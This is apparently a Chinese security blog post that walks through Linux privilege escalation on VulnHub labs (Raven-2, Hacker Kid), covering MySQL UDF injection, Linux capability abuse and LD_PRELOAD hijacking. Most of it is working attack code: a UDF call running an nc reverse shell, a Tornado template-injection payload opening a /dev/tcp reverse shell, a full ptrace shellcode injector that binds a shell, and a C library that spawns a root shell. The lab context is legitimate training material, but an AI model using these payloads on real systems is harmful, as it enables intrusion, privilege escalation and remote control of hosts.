---
title: "4.Linux 提权实战：MySQL UDF、Capability 能力机制与 LD_PRELOAD 劫持"
slug: linux-privilege-escalation-mysql-udf-capability-ld-preload
cover: ""
date: 2026-01-09
categories:
  - 权限提升
tags:
  - MySQL提权
  - Capability
  - LD_PRELOAD
halo:
  site: http://www.hzhsec.top
  name: 5b985af0-522c-4619-945d-9d9756083cba
  publish: true
---

```

Capability能力,数据库提权,LD_Preload加载

<!--more-->
# 数据库

环境
https://www.vulnhub.com/entry/raven-2,269/

1、信息收集：

dirsearch爆破子目录
![[屏幕截图 2025-10-31 153511.png]]

发现有vendor路径和wordpress
```

[http://192.168.88.152/vendor/](http://192.168.88.152/vendor/)
```

找到了发现phpmailer插件,版本为5.2.16
![[屏幕截图 2025-10-31 154755.png]]

![[屏幕截图 2025-10-31 154657.png]]

搜索历史漏洞

2、Web权限获取：

```

searchsploit phpmailer
```
![[屏幕截图 2025-10-31 155145.png]]
```

locate php/webapps/40974.py
```
![[Pasted image 20251031155315.png]]

复制+修改poc脚本
```

cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py
```
![[Pasted image 20251031155942.png]]

```

python poc.py
```
![[Pasted image 20251031160606.png]]
翻到数据库账号密码
![[Pasted image 20251031160759.png]]

## MYSQL-UDF提权(手工)：

先起一个交互终端
```

python -c 'import pty; pty.spawn("/bin/bash")'
php -r '$proc=proc_open("/bin/bash",[0=>STDIN,1=>STDOUT,2=>STDERR],$pipes);proc_close($proc);'
```

已经编译好的so文件目录
```

/usr/share/metasploit-framework/data/exploits/mysql
/usr/share/sqlmap/data/udf/mysql
```
自行编译UDF.so.先确定架构
```

show variables like '%compile%';
```
![[Pasted image 20251031165451.png]]

```

searchsploit udf

cp /usr/share/exploitdb/exploits/linux/local/1518.c .

gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc

# 编译64位版本的UDF

gcc -shared -fPIC -m64 -o udf2.so 1518.c
```

简单web
```

python -m http.server 8888
```
![[Pasted image 20251031161646.png]]

- 下载到目标上

```

cd tmp
wget http://192.168.88.145:8888/utf.so
````
![[Pasted image 20251031162016.png]]

- 连接进行导出调用
```shell
mysql -uroot -pR@v3nSecurity
````

## 确认能否执行udf
```sql
select version(); #查看mysql版本
```

5.5.60-0+deb8u1默认不启用secure_file_priv
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
select @@basedir; #确认mysql安装位置

show variables like '%basedir%'; #确认mysql安装位置

show variables like '%secure%'; #查看可导出文件位置

show variables like '%plugin%'; #查找插件位置

show variables like '%compile%'; #查看系统版本

use mysql;
```

### 创建xiaodi表

```
create table hzhsec(line blob);
```

### 往hzhsec表中插入二进制的udf.so

```
insert into hzhsec values(load_file('/tmp/udf.so'));
```

### 导出udf.so

```
select * from hzhsec into dumpfile '/usr/lib/mysql/plugin/udf4.so';
```

![[Pasted image 20251031165350.png]]

### 创建do_system自定义函数

```
create function do_system returns integer soname 'udf3.so';

select do_system('nc 192.168.88.145 5555 -e /bin/bash');
```

![[Pasted image 20251031165633.png]]

## 工具梭哈

查看root是否支持远程登录

```
SELECT user, host FROM mysql.user WHERE user = 'root';
```

![[Pasted image 20251031165936.png]]
很明显不支持

### 开启远程登录

```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'v3nSecurity' WITH GRANT OPTION;

flush privileges;
```

由于没有开放3306端口,这个利用不了

---

# Capability能力

Capability能力,简单来说就是一个方便的权限管理的机制

原理参考：
[https://www.cnblogs.com/f-carey/p/16026088.html](https://www.cnblogs.com/f-carey/p/16026088.html)

```
cp /usr/bin/php /tmp/php
```

```
设置能力：setcap cap_setuid+ep /tmp/php

删除能力：setcap -r /tmp/php

查看单个能力：getcap /usr/bin/php

查看所有能力：getcap -r / 2>/dev/null
```

**Hacker_Kid靶场**

WP参考：
[https://www.jianshu.com/p/60673ac0454f](https://www.jianshu.com/p/60673ac0454f)

环境：
[https://www.vulnhub.com/entry/hacker-kid-101,719/](https://www.vulnhub.com/entry/hacker-kid-101,719/)

## 权限获取

端口扫描
![[Pasted image 20251031184934.png]]
看到80端口开放,查看网页

![[Pasted image 20251031185030.png]]
为静态网页,观察前端源码提示,拼接get请求参数

```
http://192.168.88.153/?page_no=1
```

到page=21时显示提示
![[Pasted image 20251031185152.png]]
根据提示使用dig查看 192.168.88.153 hackers.blackhat.local其他的子域名

```
dig hackers.blackhat.local @192.168.88.153
```

发现子域名 hackerkid.blackhat.local

修改hosts文件
windows :
C:\Windows\System32\drivers\etc

```
192.168.88.153 hackerkid.blackhat.local
192.168.88.153 hackers.blackhat.local
```

访问hackers.blackhat.local,看到另一个网页
![[Pasted image 20251031185550.png]]
拦截数据包
发现存在xml输入,测试是否有XXE漏洞

email参数有回显
![[Pasted image 20251031190649.png]]
注入xxepayload,成功回显
![[Pasted image 20251031190934.png]]
看出只有root和saket是可登录用户
读取当前用户的文件

```
/home/saket/.bashrc
```

返回值被拦截了用伪协议
![[Pasted image 20251031191402.png]]
解码获取账号密码
![[Pasted image 20251031191515.png]]
推测是用户saket的
来到9999端口,有登录页面,成功登录用户saket

```
saket
Saket!#$%@!!
```

name参数发现模板注入

```
http://hackerkid.blackhat.local:9999/?name={{7*7}}
```

由于是端口9999,推测（9999端口，Tornado）

```
{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.88.145/6688 0>&1"')}}
```

反弹shell,要进行url编码

```
http://hackerkid.blackhat.local:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F192.168.88.145%2F6688%200%3E%261%22')%7D%7D
```

![[Pasted image 20251031201437.png]]

## 权限提升

获取Capability能力的概况

```
/sbin/getcap -r / 2>/dev/null
```

参考见附录
![[Pasted image 20251031201840.png]]

```
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程，对进程进行内存修改及查看等活动，利用提权脚本：
脚本inject.py见附录

控制主机下载

```
python -m http.server 8080
wget http://192.168.88.145:8888/inject.py
```

批量注入命令

```
for i in `ps -ef|grep root|grep -v "grep"|awk '{print $2}'`; do python2.7 inject.py $i; done
```

查看是否成功

```
netstat -ano | grep 5600
```

![[Pasted image 20251031203235.png]]
远程连接

```
nc 192.168.88.153 5600
```

结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用
![[Pasted image 20251031203443.png]]

---

# LD_Preload加载

参考：
[https://www.cnblogs.com/backlion/p/10503985.html](https://www.cnblogs.com/backlion/p/10503985.html)

修改/etc/sudoers

```
Defaults env_keep += LD_PRELOAD
```

将用户hzhsec添加到sudo默认不用密码

```
hzhsec ALL=(ALL:ALL) NOPASSWD: /usr/bin/find
```

![[Pasted image 20251031204510.png]]

目录中创建shell.c文件
交互终端

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

编译它以生成一个带有.so扩展名的共享对象，同样在Windows操作系统中使用.dll文件

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
```

![[Pasted image 20251031204959.png]]

获取root权限

```
sudo LD_PRELOAD=/tmp/shell.so find
whoami
```

![[Pasted image 20251031205135.png]]

注意,和sudo提权有区别
当修改成无法通过sudo利用的文件时

```
hzhsec ALL=(ALL:ALL) NOPASSWD: /tmp/hzh.sh
```

hzh.sh内容只有一个ls
![[Pasted image 20251031205858.png]]

```
sudo LD_PRELOAD=/tmp/shell.so /tmp/hzh.sh
```

同样执行成功
![[Pasted image 20251031205939.png]]
**结论**：sudo提权有限制，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权

---

# 附录

权限参考

```
CAP_CHOWN 0 允许改变文件的所有权

CAP_DAC_OVERRIDE 1 忽略对文件的所有DAC访问限制

CAP_DAC_READ_SEARCH 2 忽略所有对读、搜索操作的限制

CAP_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID

CAP_FSETID 4 确保在文件被修改后不修改setuid/setgid位

CAP_KILL 5 允许对不属于自己的进程发送信号

CAP_SETGID 6 允许改变组ID

CAP_SETUID 7 允许改变用户ID

CAP_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程)

CAP_LINUX_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性

CAP_NET_BIND_SERVICE 10 允许绑定到小于1024的端口

CAP_NET_BROADCAST 11 允许网络广播和多播访问(未使用)

CAP_NET_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等.

CAP_NET_RAW 13 允许使用原始(raw)套接字

CAP_IPC_LOCK 14 允许锁定共享内存片段

CAP_IPC_OWNER 15 忽略IPC所有权检查

CAP_SYS_MODULE 16 插入和删除内核模块

CAP_SYS_RAWIO 17 允许对ioperm/iopl的访问

CAP_SYS_CHROOT 18 允许使用chroot()系统调用

CAP_SYS_PTRACE 19 允许跟踪任何进程

CAP_SYS_PACCT 20 允许配置进程记帐(process accounting)

CAP_SYS_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等.

CAP_SYS_BOOT 22 允许重新启动系统

CAP_SYS_NICE 23 允许提升优先级，设置其它进程的优先级

CAP_SYS_RESOURCE 24 忽略资源限制

CAP_SYS_TIME 25 允许改变系统时钟

CAP_SYS_TTY_CONFIG 26 允许配置TTY设备

CAP_MKNOD 27 允许使用mknod()系统调用

CAP_LEASE 28 允许在文件上建立租借锁

CAP_SETFCAP 31 允许在指定的程序上授权能力给其它程序
```

inject.py

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]
 
libc = ctypes.CDLL("libc.so.6")
 
pid=int(sys.argv[1])
 
# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64
 
# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()
 
# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))
 
# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
 
# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)
 
    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
 
print("Shellcode Injected!!")
 
# Modify the instuction pointer
registers.rip=registers.rip+2
 
# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))
 
# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```